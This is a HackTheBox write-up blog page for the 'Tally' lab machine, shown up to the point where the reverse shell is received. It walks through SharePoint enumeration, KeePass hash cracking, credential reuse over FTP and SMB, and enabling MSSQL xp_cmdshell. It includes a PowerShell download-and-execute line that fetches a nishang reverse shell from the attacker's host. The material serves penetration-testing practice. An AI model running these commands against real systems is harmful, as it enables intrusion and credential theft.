@@ -1,0 +1,771 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="author" content="Marco Meli">
+  <meta name="description" content="Tally | First thing first, this box is slow! Everything takes ages to load, especially sharepoint. Putting this little frustration aside, Tally taught me...">
+
+  <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+  <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">  
+  <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/css/bootstrap.min.css" type="text/css" media="all">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/font.css" type="text/css" media="all">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/style.css" type="text/css" media="all">
+
+  
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/js/bootstrap.min.js"></script>
+  <script type="text/javascript" src="https://sittingducks.io/theme/js/functions.min.js"></script>
+
+  <link href="https://sittingducks.io/theme/css/colorbox.css" rel="stylesheet">
+
+  <link href="https://fonts.googleapis.com/css?family=Squada+One|Source+Code+Pro|Merriweather:300|Abril+Fatface" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+  <script src="/theme/tipuesearch/tipuesearch_set.js"></script>
+  <script src="/tipuesearch_content.js"></script>
+  <link rel="stylesheet" href="/theme/tipuesearch/tipuesearch.css">
+  <script src="/theme/tipuesearch/tipuesearch.js"></script>
+ 
+
+
+<meta name="keywords" content="HackTheBox">
+
+
+  <title>Tally</title>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-156989597-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+  
+</head>
+
+<body class="home blog">
+  <div>
+    <header class="site-header">
+      <nav class="navbar navbar-default" role="navigation"> 
+	  
+		<form id="searchform" action="/search" onsubmit="return (this.elements['q'].value.length > 0)">
+		<input id="searchbox" type="text" name="q" size="12" placeholder="Search">
+		</form>
+		
+        <div class="container">
+          <div class="row">
+            <div class="site-navigation-inner col-sm-12">
+              <div class="navbar-header">
+                <button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+                  <span class="sr-only">Toggle navigation</span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                </button>
+              </div>
+              <div class="collapse navbar-collapse navbar-ex1-collapse">
+              <ul id="menu-all-pages" class="nav navbar-nav">
+                <li class="menu-item"><a href="htts://sittingducks.io" >home
+<i class="fa  fa-lg"></i></a></li>
+              </ul>
+              </div>
+              <div class="social">   
+                <a href="https://linkedin.com/in/marco-meli-12668530/" title="Linkedin" >
+<i class="fa fa-linkedin fa-lg"></i></a>
+                <a href="https://twitter.com/M4rC0ff" title="Twitter" >
+<i class="fa fa-twitter fa-lg"></i></a>
+                <a href="https://github.com/M4rc0ff" title="github" >
+<i class="fa fa-github fa-lg"></i></a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav><!-- .site-navigation -->
+
+      <div class="container">
+      <div id="logo">
+        <span class="site-name"><a class="navbar-brand" href="https://sittingducks.io"><img width="310" src="../images/logo.png" class="attachment-full size-full" alt="logo">          </a>
+        </span><!-- end of .site-name -->
+      </div><!-- end of #logo -->
+        <div class="tagline">
+                <a href="https://sittingducks.io/tag/cheatsheets.html" >CheatSheets (1)</a> &#124; 
+                <a href="https://sittingducks.io/tag/hackthebox.html" >HackTheBox (32)</a> &#124; 
+                <a href="https://sittingducks.io/tag/vulnhub.html" >VulnHub (1)</a> &#124; 
+                <a href="https://sittingducks.io/archives.html" >Archives (34)</a>
+        </div>
+    </div>
+
+  </header><!-- #masthead -->
+  </div>
+    <div id="content" class="site-content">
+      <div class="container main-content-area">
+        <div class="row">
+          <div class="main-content-inner col-sm-12 col-md-12">
+            <div id="primary" class="content-area">
+              <div id="main" class="site-main" role="main">
+                <div class="article-container">
+<article>
+  <div class="blog-item-wrap">
+    <div class="post-inner-content">
+      <header class="entry-header page-header">
+        <span class="cat-item"><time datetime="2020-05-18 23:34:00+01:00">Mon 18 May 2020</time></span>
+        <h1 class="entry-title"><a href="https://sittingducks.io/Tally.html">Tally</a></h1>
+      </header><!-- .entry-header -->
+      <div class="fb-like" data-href="https://sittingducks.io/Tally.html" data-layout="standard" data-action="like" data-show-faces="false" data-share="true"></div>
+      <div class="entry-content">
+        <p>First thing first, this box is slow! Everything takes ages to load, especially sharepoint. Putting this little frustration aside, Tally taught me quite few things. One thing I learnt, for instance, is that <code>viewlsts.aspx</code> is a default page you should always check in sharepoint even before scanning for directories, I wasted quite some time in there. Thanks to some credentials found on sharepoint you can get into the box through FTP. Then you will find a KeePass file to crack and SQL credentials found on an exe file, not an easy one to spot to be honest. Then you can get a reverse shell through the <code>xp_cmdshell</code> in MSSQL. There are also few ways to privesc but I used Juicy Potato exploit to impersonate the “NT AUTHORITY\SYSTEM” account. Overall lot of fun!  </p>
+<h1 id="recon">Recon</h1>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> nmap -sC -sV <span class="m">10</span>.10.10.59
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-18 22:26 BST</span>
+<span class="go">Nmap scan report for 10.10.10.59</span>
+<span class="go">Host is up (0.62s latency).</span>
+<span class="go">Not shown: 992 closed ports</span>
+<span class="go">PORT     STATE SERVICE       VERSION</span>
+<span class="go">21/tcp   open  ftp           Microsoft ftpd</span>
+<span class="go">| ftp-syst: </span>
+<span class="go">|_  SYST: Windows_NT</span>
+<span class="go">80/tcp   open  http          Microsoft IIS httpd 10.0</span>
+<span class="go">|_http-generator: Microsoft SharePoint</span>
+<span class="go">|_http-server-header: Microsoft-IIS/10.0</span>
+<span class="go">| http-title: Home</span>
+<span class="go">|_Requested resource was http://10.10.10.59/_layouts/15/start.aspx#/default.aspx</span>
+<span class="go">81/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span>
+<span class="go">|_http-server-header: Microsoft-HTTPAPI/2.0</span>
+<span class="go">|_http-title: Bad Request</span>
+<span class="go">135/tcp  open  msrpc         Microsoft Windows RPC</span>
+<span class="go">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span>
+<span class="go">445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds</span>
+<span class="go">808/tcp  open  ccproxy-http?</span>
+<span class="go">1433/tcp open  ms-sql-s      Microsoft SQL Server 2016 13.00.1601.00; RTM</span>
+<span class="go">| ms-sql-ntlm-info: </span>
+<span class="go">|   Target_Name: TALLY</span>
+<span class="go">|   NetBIOS_Domain_Name: TALLY</span>
+<span class="go">|   NetBIOS_Computer_Name: TALLY</span>
+<span class="go">|   DNS_Domain_Name: TALLY</span>
+<span class="go">|   DNS_Computer_Name: TALLY</span>
+<span class="go">|_  Product_Version: 10.0.14393</span>
+<span class="go">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback</span>
+<span class="go">| Not valid before: 2020-05-18T20:37:53</span>
+<span class="go">|_Not valid after:  2050-05-18T20:37:53</span>
+<span class="go">|_ssl-date: 2020-05-18T21:26:32+00:00; -1m47s from scanner time.</span>
+<span class="go">Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows</span>
+
+<span class="go">Host script results:</span>
+<span class="go">|_clock-skew: mean: -1m47s, deviation: 0s, median: -1m47s</span>
+<span class="go">| ms-sql-info: </span>
+<span class="go">|   10.10.10.59:1433: </span>
+<span class="go">|     Version: </span>
+<span class="go">|       name: Microsoft SQL Server 2016 RTM</span>
+<span class="go">|       number: 13.00.1601.00</span>
+<span class="go">|       Product: Microsoft SQL Server 2016</span>
+<span class="go">|       Service pack level: RTM</span>
+<span class="go">|       Post-SP patches applied: false</span>
+<span class="go">|_    TCP port: 1433</span>
+<span class="go">|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)</span>
+<span class="go">| smb-security-mode: </span>
+<span class="go">|   account_used: guest</span>
+<span class="go">|   authentication_level: user</span>
+<span class="go">|   challenge_response: supported</span>
+<span class="go">|_  message_signing: disabled (dangerous, but default)</span>
+<span class="go">| smb2-security-mode: </span>
+<span class="go">|   2.02: </span>
+<span class="go">|_    Message signing enabled but not required</span>
+<span class="go">| smb2-time: </span>
+<span class="go">|   date: 2020-05-18T21:26:20</span>
+<span class="go">|_  start_date: 2020-05-18T20:37:27</span>
+
+<span class="go">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="go">Nmap done: 1 IP address (1 host up) scanned in 111.77 seconds</span>
+</pre></div>
+
+
+<p>nmap gave few results. As a start we will have a look at the default http page:</p>
+<p><img alt="" src="../images/tally-home.png"></p>
+<p>As pointed by the nmap output, we are dealing with a sharepoint web application. I inspected the heml source code and did not find anything suspicious. </p>
+<p>I started scanning for directories with <code>gobuster</code> using the dirbuster medium directory list file but it was extremely slows. At that point I found out there are other directory listing files tailored for sharepoint,  such as <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CMS/Sharepoint.fuzz.txt">SecLists</a> one.</p>
+<p>So I give it a try:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> gobuster dir -u <span class="m">10</span>.10.10.59 -w /usr/share/wordlist/SecLists/Discovery/Web-Content/CMS/sharepoint.txt                                                                                              
+<span class="go">===============================================================                                                                                                                                                  </span>
+<span class="go">Gobuster v3.0.1                                                                                                                                                                                                  </span>
+<span class="go">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)                                                                                                                                                  </span>
+<span class="go">===============================================================                                                                                                                                                  </span>
+<span class="go">[+] Url:            http://10.10.10.59                                                                                                                                                                           </span>
+<span class="go">[+] Threads:        10                                                                                                                                                                                           </span>
+<span class="go">[+] Wordlist:       /usr/share/SecLists/Discovery/Web-Content/CMS/sharepoint.txt                                                                                                                                 </span>
+<span class="go">[+] Status codes:   200,204,301,302,307,401,403                                                                                                                                                                  </span>
+<span class="go">[+] User Agent:     gobuster/3.0.1                                                                                                                                                                               </span>
+<span class="go">[+] Timeout:        10s                                                                                                                                                                                          </span>
+<span class="go">===============================================================                                                                                                                                                  </span>
+<span class="go">2020/05/19 06:58:49 Starting gobuster                                                                                                                                                                            </span>
+<span class="go">===============================================================                                                                                                                                                  </span>
+<span class="go">/_app_bin (Status: 301)                                                                                                                                                                                          </span>
+<span class="go">/_controltemplates (Status: 301)                                                                                                                                                                                 </span>
+<span class="go">/_layouts (Status: 301)                                                                                                                                                                                          </span>
+<span class="go">/_layouts/1033 (Status: 301)                                                                                                                                                                                     </span>
+<span class="go">/_layouts/1033/avreport.htm (Status: 200)</span>
+
+<span class="go">&lt;SNIP&gt;</span>
+
+<span class="go">/_layouts/viewedit.aspx (Status: 302)                                                                                                                                                                            </span>
+<span class="go">/_layouts/viewlsts.aspx (Status: 302)                                                                                                                                                                            </span>
+<span class="go">/_layouts/versions.aspx (Status: 302)                                                                                                                                                                            </span>
+<span class="go">/_layouts/versiondiff.aspx (Status: 302)                                                                                                                                                                         </span>
+<span class="go">/_layouts/viewgrouppermissions.aspx (Status: 302)                                                                                                                                                                </span>
+<span class="go">/_layouts/viewscopes.aspx (Status: 302)                                                                                                                                                                          </span>
+<span class="go">/_layouts/viewnew.aspx (Status: 302)                                                                                                                                                                             </span>
+<span class="go">/_layouts/viewscopesettings.aspx (Status: 302)                                                                                                                                                                   </span>
+<span class="go">/_layouts/viewtype.aspx (Status: 302)      </span>
+
+<span class="go">&lt;SNIP&gt;</span>
+</pre></div>
+
+
+<p>I got too many results and I started checking some of the more meaningful names but was getting nowhere, mostly because of my unfamiliarity with Sharepoint. Then I learnt that <code>viewlsts.aspx</code> is a default page that should be checked:</p>
+<p><img alt="" src="../images/tally-viewlsts.png"></p>
+<p>Here we can see 2 available items. Navigating to the documents page shows a word file:</p>
+<p><img alt="" src="../images/tally-ftp-details.png"></p>
+<p>Once I downloaded the word doc I can see these details inside:</p>
+<div class="highlight"><pre><span></span><span class="go">FTP details</span>
+<span class="go">hostname: tally</span>
+<span class="go">workgroup: htb.local</span>
+<span class="go">password: UTDRSCH53c&quot;$6hys</span>
+<span class="go">Please create your own user folder upon logging in</span>
+</pre></div>
+
+
+<p>Seems like we have a password but we are missing the user name.</p>
+<p>Navigating to the SitePages I can see this:</p>
+<p><img alt="" src="../images/tally-finance-details.png"></p>
+<p>Apparently ftp_user is a valid user. Let's try if the password we found matches this account:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> ftp <span class="m">10</span>.10.10.59
+<span class="go">Connected to 10.10.10.59.</span>
+<span class="go">220 Microsoft FTP Service</span>
+<span class="go">Name (10.10.10.59:m4rc0ff): ftp_user</span>
+<span class="go">331 Password required</span>
+<span class="go">Password:</span>
+<span class="go">230 User logged in.</span>
+<span class="go">Remote system type is Windows_NT.</span>
+<span class="go">ftp&gt; </span>
+</pre></div>
+
+
+<p>We are in!</p>
+<p>I noticed there are few directories with with many files. So I looked up for a way to donwload all files from an FTP and found out we can use <code>wget</code> to do that:</p>
+<div class="highlight"><pre><span></span><span class="go">wget -m --user=username --password=password ftp://FTPSERVER</span>
+</pre></div>
+
+
+<p>Having the files locally would allow me to explore them easily and  do stuff like grep and so on.</p>
+<p>so I added <code>tally.htb.local</code> to my <code>/etc/hosts</code> file and then I ran this command:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/tally$</span> wget -m --user<span class="o">=</span>ftp_user --password<span class="o">=</span><span class="s1">&#39;UTDRSCH53c&quot;$6hys&#39;</span> ftp://tally.htb.local                                                                                     
+<span class="go">--2020-05-19 08:48:39--  ftp://tally.htb.local/                                                                                                                                                                  </span>
+<span class="go">           =&gt; ‘tally.htb.local/.listing’                                                                                                                                                                         </span>
+<span class="go">Resolving tally.htb.local (tally.htb.local)... 10.10.10.59                                                                                                                                                       </span>
+<span class="go">Connecting to tally.htb.local (tally.htb.local)|10.10.10.59|:21... connected.                                                                                                                                    </span>
+<span class="go">Logging in as ftp_user ... Logged in!                                                                                                                                                                            </span>
+<span class="go">==&gt; SYST ... done.    ==&gt; PWD ... done.</span>
+<span class="go">==&gt; TYPE I ... done.  ==&gt; CWD not needed.</span>
+<span class="go">==&gt; PASV ... done.    ==&gt; LIST ... done.</span>
+
+<span class="go">tally.htb.local/.listing                                 [ &lt;=&gt;                                                                                                                ]     244  --.-KB/s    in 0s      </span>
+
+<span class="go">==&gt; PASV ... done.    ==&gt; LIST ... done.</span>
+
+<span class="go">tally.htb.local/.listing                                 [ &lt;=&gt;                                                                                                                ]     244  --.-KB/s    in 0s      </span>
+
+<span class="go">2020-05-19 08:48:41 (70.3 MB/s) - ‘tally.htb.local/.listing’ saved [488]</span>
+
+<span class="go">&lt;SNIP&gt;</span>
+</pre></div>
+
+
+<p>Once the files are downloaded I launch an <code>ll -R|less</code> so I can see the content of all the directories recursively. One thing got immediately my attention:</p>
+<div class="highlight"><pre><span></span><span class="go">./Tim/Files:</span>
+<span class="go">total 12</span>
+<span class="go">-rw-r--r-- 1 m4rc0ff m4rc0ff   17 Sep 15  2017 bonus.txt</span>
+<span class="go">drwxr-xr-x 4 m4rc0ff m4rc0ff 4096 May 19 09:16 KeePass-2.36</span>
+<span class="go">-rw-r--r-- 1 m4rc0ff m4rc0ff 2222 Sep 15  2017 tim.kdbx</span>
+</pre></div>
+
+
+<p>the <code>tim.kdbx</code> is a keePass file as confirmed below:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/tally/ftpFiles/User/Tim/Files$</span> file tim.kdbx 
+<span class="go">tim.kdbx: Keepass password database 2.x KDBX</span>
+</pre></div>
+
+
+<p>To convert this to an hash we can use <code>keepass2john</code>:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/tally/ftpFiles/User/Tim/Files$</span> keepass2john tim.kdbx 
+<span class="gp">tim:$keepass$</span>*2*6000*0*f362b5565b916422607711b54e8d0bd20838f5111d33a5eed137f9d66a375efb*3f51c5ac43ad11e0096d59bb82a59dd09cfd8d2791cadbdb85ed3020d14c8fea*3f759d7011f43b30679a5ac650991caa*b45da6b5b0115c5a7fb688f8179a19a749338510dfe90aa5c2cb7ed37f992192*535a85ef5c9da14611ab1c1edc4f00a045840152975a4d277b3b5c4edc1cd7da
+</pre></div>
+
+
+<p>Then we can use <code>hashcat</code> to crack the hash. Before doing so I check the <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">hashcat official wiki</a> and grab the hash-mode for keepass, that is <code>13400</code>.</p>
+<p>Then I put the hash in a file and launch the below command to brute force the hash:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/tally$</span> hashcat -m <span class="m">13400</span> timKeePassHash /usr/share/wordlists/rockyou.txt  --force
+<span class="go">hashcat (v5.1.0) starting...</span>
+
+<span class="go">&lt;SNIP&gt;</span>
+
+<span class="gp">$</span>keepass<span class="nv">$*</span><span class="m">2</span>*6000*0*f362b5565b916422607711b54e8d0bd20838f5111d33a5eed137f9d66a375efb*3f51c5ac43ad11e0096d59bb82a59dd09cfd8d2791cadbdb85ed3020d14c8fea*3f759d7011f43b30679a5ac650991caa*b45da6b5b0115c5a7fb688f8179a19a749338510dfe90aa5c2cb7ed37f992192*535a85ef5c9da14611ab1c1edc4f00a045840152975a4d277b3b5c4edc1cd7da:simplementeyo
+
+<span class="go">Session..........: hashcat</span>
+<span class="go">Status...........: Cracked</span>
+<span class="go">Hash.Type........: KeePass 1 (AES/Twofish) and KeePass 2 (AES)</span>
+<span class="go">Hash.Target......: $keepass$*2*6000*0*f362b5565b916422607711b54e8d0bd2...1cd7da</span>
+<span class="go">Time.Started.....: Tue May 19 20:41:06 2020 (13 secs)</span>
+<span class="go">Time.Estimated...: Tue May 19 20:41:19 2020 (0 secs)</span>
+<span class="go">Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)</span>
+<span class="go">Guess.Queue......: 1/1 (100.00%)</span>
+<span class="go">Speed.#1.........:     1938 H/s (10.67ms) @ Accel:512 Loops:128 Thr:1 Vec:8</span>
+<span class="go">Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts</span>
+<span class="go">Progress.........: 25600/14344385 (0.18%)</span>
+<span class="go">Rejected.........: 0/25600 (0.00%)</span>
+<span class="go">Restore.Point....: 24576/14344385 (0.17%)</span>
+<span class="go">Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:5888-6000</span>
+<span class="go">Candidates.#1....: 280690 -&gt; johnnyd</span>
+
+<span class="go">Started: Tue May 19 20:40:54 2020</span>
+<span class="go">Stopped: Tue May 19 20:41:20 2020</span>
+</pre></div>
+
+
+<p>So the password is <code>simplementeyo</code>.</p>
+<p>Using <code>Keepass2</code> client we can open the <code>tim.kdbx</code> file and we should be able to login with the password we found:</p>
+<p><img alt="" src="../images/tally-keepass.png"></p>
+<p>Once in, I found a password for the "TALLY ACCT SHARE". If you remember from the <code>nmap</code> output the smb ports are open so we can try to login to the share using the credentials we just found:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> smbclient //10.10.10.59/ACCT -U Finance
+<span class="go">Enter WORKGROUP\Finance&#39;s password: </span>
+<span class="go">Try &quot;help&quot; to get a list of possible commands.</span>
+<span class="go">smb: \&gt; ls</span>
+<span class="go">  .                                   D        0  Mon Sep 18 06:58:18 2017</span>
+<span class="go">  ..                                  D        0  Mon Sep 18 06:58:18 2017</span>
+<span class="go">  Customers                           D        0  Sun Sep 17 21:28:40 2017</span>
+<span class="go">  Fees                                D        0  Mon Aug 28 22:20:52 2017</span>
+<span class="go">  Invoices                            D        0  Mon Aug 28 22:18:19 2017</span>
+<span class="go">  Jess                                D        0  Sun Sep 17 21:41:29 2017</span>
+<span class="go">  Payroll                             D        0  Mon Aug 28 22:13:32 2017</span>
+<span class="go">  Reports                             D        0  Fri Sep  1 21:50:11 2017</span>
+<span class="go">  Tax                                 D        0  Sun Sep 17 21:45:47 2017</span>
+<span class="go">  Transactions                        D        0  Wed Sep 13 20:57:44 2017</span>
+<span class="go">  zz_Archived                         D        0  Fri Sep 15 21:29:35 2017</span>
+<span class="go">  zz_Migration                        D        0  Sun Sep 17 21:49:13 2017</span>
+
+<span class="go">                8387839 blocks of size 4096. 449367 blocks available</span>
+</pre></div>
+
+
+<p>More directories to dig through! Took me a while but I found some SQL credentials into the <code>xx_Archived</code> directory:</p>
+<div class="highlight"><pre><span></span><span class="go">smb: \zz_Archived\SQL\&gt; ls</span>
+<span class="go">  .                                   D        0  Fri Sep 15 21:29:36 2017</span>
+<span class="go">  ..                                  D        0  Fri Sep 15 21:29:36 2017</span>
+<span class="go">  conn-info.txt                       A       77  Sun Sep 17 21:26:56 2017</span>
+
+<span class="go">                8387839 blocks of size 4096. 448720 blocks available</span>
+<span class="go">smb: \zz_Archived\SQL\&gt; get conn-info.txt</span>
+<span class="go">getting file \zz_Archived\SQL\conn-info.txt of size 77 as conn-info.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)</span>
+</pre></div>
+
+
+<p>The <code>conn-info.txt</code> has the credentials:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/tally$</span> cat conn-info.txt 
+<span class="go">old server details</span>
+
+<span class="go">db: sa</span>
+<span class="go">pass: YE%TJC%&amp;HYbe5Nw</span>
+</pre></div>
+
+
+<p><code>nmap</code> showed an SQL server running, let's see if we can login using <a href="https://en.wikipedia.org/wiki/Sqsh">sqsh</a>:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> sqsh -S <span class="m">10</span>.10.10.59 -U sa
+<span class="go">sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray</span>
+<span class="go">Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp</span>
+<span class="go">This is free software with ABSOLUTELY NO WARRANTY</span>
+<span class="go">For more information type &#39;\warranty&#39;</span>
+<span class="go">Password: </span>
+<span class="go">Login failed for user &#39;sa&#39;.</span>
+<span class="go">Password: </span>
+</pre></div>
+
+
+<p>The login wasn't successful so maybe it's just a rabbit hole. I get back to recon and resume where I left, that is the <code>zz_migration</code> directory:</p>
+<div class="highlight"><pre><span></span><span class="go">smb: \zz_migration\Binaries\New folder\&gt; ls</span>
+<span class="go">  .                                   D        0  Thu Sep 21 07:21:09 2017</span>
+<span class="go">  ..                                  D        0  Thu Sep 21 07:21:09 2017</span>
+<span class="go">  crystal_reports_viewer_2016_sp04_51051980.zip      A 389188014  Wed Sep 13 20:56:38 2017</span>
+<span class="go">  Macabacus2016.exe                   A 18159024  Mon Sep 11 22:20:05 2017</span>
+<span class="go">  Orchard.Web.1.7.3.zip               A 21906356  Wed Aug 30 00:27:42 2017</span>
+<span class="go">  putty.exe                           A   774200  Sun Sep 17 21:19:26 2017</span>
+<span class="go">  RpprtSetup.exe                      A   483824  Fri Sep 15 20:49:46 2017</span>
+<span class="go">  tableau-desktop-32bit-10-3-2.exe      A 254599112  Mon Sep 11 22:13:14 2017</span>
+<span class="go">  tester.exe                          A   215552  Fri Sep  1 12:15:54 2017</span>
+<span class="go">  vcredist_x64.exe                    A  7194312  Wed Sep 13 21:06:28 2017</span>
+
+<span class="go">                8387839 blocks of size 4096. 448524 blocks available</span>
+</pre></div>
+
+
+<p>In there there is an exe which is dubbed <code>tester.exe</code> and as such it is interesting with respect to the others since it seems a custom created file. After getting the file in my box, a basic analysis of the executable with <code>strings</code> reveals something interesting:</p>
+<div class="highlight"><pre><span></span><span class="go">&lt;SNIP&gt;</span>
+<span class="go">WVS3</span>
+<span class="go">&lt;$Xf</span>
+<span class="go">^_[3</span>
+<span class="go">SQLSTATE: </span>
+<span class="go">Message: </span>
+<span class="go">DRIVER={SQL Server};SERVER=TALLY, 1433;DATABASE=orcharddb;UID=sa;PWD=GWE3V65#6KFH93@4GWTG2G;</span>
+<span class="go">select * from Orchard_Users_UserPartRecord</span>
+<span class="go">Unknown exception</span>
+<span class="go">bad cast</span>
+<span class="go">bad locale name</span>
+<span class="go">false</span>
+<span class="go">&lt;SNIP&gt;</span>
+</pre></div>
+
+
+<p>From the above we can see that the tester does some kind of call to a db utilizing the following credentials:</p>
+<p><code>UID= sa</code></p>
+<p><code>PWD= GWE3V65#6KFH93@4GWTG2G</code></p>
+<p>Let's check again if these credentials work with <code>sqsh</code>:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> sqsh -S <span class="m">10</span>.10.10.59 -U sa
+<span class="go">sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray</span>
+<span class="go">Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp</span>
+<span class="go">This is free software with ABSOLUTELY NO WARRANTY</span>
+<span class="go">For more information type &#39;\warranty&#39;</span>
+<span class="go">Password: </span>
+<span class="go">1&gt;</span>
+</pre></div>
+
+
+<p>This time we are in!</p>
+<p><code>MSSQL</code> has a shell we can use to run commands, that is <code>xp_cmdshell</code>:</p>
+<div class="highlight"><pre><span></span><span class="go">1&gt; xp_cmdshell &#39;whoami&#39;</span>
+<span class="go">2&gt; go</span>
+
+<span class="go">        output                                                                                                                                                                                                   </span>
+
+
+
+<span class="go">        ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span>
+<span class="go">-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span>
+<span class="go">------------------------------------------------------------------------------------------------------</span>
+
+<span class="go">        tally\sarah                                                                                                                                                                                              </span>
+
+
+
+<span class="go">        NULL                                                                    </span>
+
+<span class="gp gp-VirtualEnv">(2 rows affected, return status = 0)</span>
+</pre></div>
+
+
+<p>running the <code>whoami</code> command as shown above command shows the user <code>sarah</code> we had previously seen in the FTP direcories. The output is quite weird so we better get a proper shell back. </p>
+<p>To do that I prepare a nishang TCP reverse shell available in my kali box at <code>/usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1</code>. To activate the shell I add the following string at the end to call the <code>Invoke-PowerShellTcp</code> function:</p>
+<div class="highlight"><pre><span></span><span class="go">Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.15 -Port 443</span>
+</pre></div>
+
+
+<p>Then I host the shell, which I renamed shell.ps1, on a python simple http server and I start a netcat listner on port 443. Now I can call the shell from the <code>xp_cmdshell</code> as follow:</p>
+<div class="highlight"><pre><span></span><span class="go">1&gt; xp_cmdshell &quot;powershell IEX(New-Object Net.WebClient).downloadString(&#39;http://10.10.14.15/shell.ps1&#39;)&quot;</span>
+<span class="go">2&gt; go</span>
+<span class="go">Msg 15281, Level 16, State 1</span>
+<span class="go">Server &#39;TALLY&#39;, Procedure &#39;xp_cmdshell&#39;, Line 1</span>
+<span class="go">SQL Server blocked access to procedure &#39;sys.xp_cmdshell&#39; of component &#39;xp_cmdshell&#39; because this component is turned off as part of the security configuration for this server. A system administrator can enable</span>
+<span class="go">the use of &#39;xp_cmdshell&#39; by using sp_configure. For more information about enabling &#39;xp_cmdshell&#39;, search for &#39;xp_cmdshell&#39; in SQL Server Books Online.</span>
+<span class="go">1&gt;</span>
+</pre></div>
+
+
+<p>Even though we were able to run <code>whoami</code> before now is giving us errors, not sure why to be honest. However I found the below commands to reconfigure and reactivate the shell:</p>
+<div class="highlight"><pre><span></span><span class="go">1&gt; EXEC SP_CONFIGURE &#39;show advanced options&#39;,1</span>
+<span class="go">2&gt; reconfigure</span>
+<span class="go">3&gt; go</span>
+<span class="go">Configuration option &#39;show advanced options&#39; changed from 0 to 1. Run the RECONFIGURE statement to install.</span>
+<span class="gp gp-VirtualEnv">(return status = 0)</span>
+<span class="go">1&gt; exec sp_configure &#39;xp_cmdshell&#39;,1</span>
+<span class="go">2&gt; reconfigure</span>
+<span class="go">3&gt; go</span>
+<span class="go">Configuration option &#39;xp_cmdshell&#39; changed from 0 to 1. Run the RECONFIGURE statement to install.</span>
+<span class="gp gp-VirtualEnv">(return status = 0)</span>
+</pre></div>
+
+
+<p>One this is done I try again:</p>
+<div class="highlight"><pre><span></span><span class="go">1&gt; xp_cmdshell &quot;powershell IEX(New-Object Net.WebClient).downloadString(&#39;http://10.10.14.15/shell.ps1&#39;)&quot;</span>
+<span class="go">2&gt; go</span>
+</pre></div>
+
+
+<p>no errors this time, and indeed I get the shell:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> sudo nc -lnvp <span class="m">443</span>
+<span class="go">[sudo] password for m4rc0ff: </span>
+<span class="go">listening on [any] 443 ...</span>
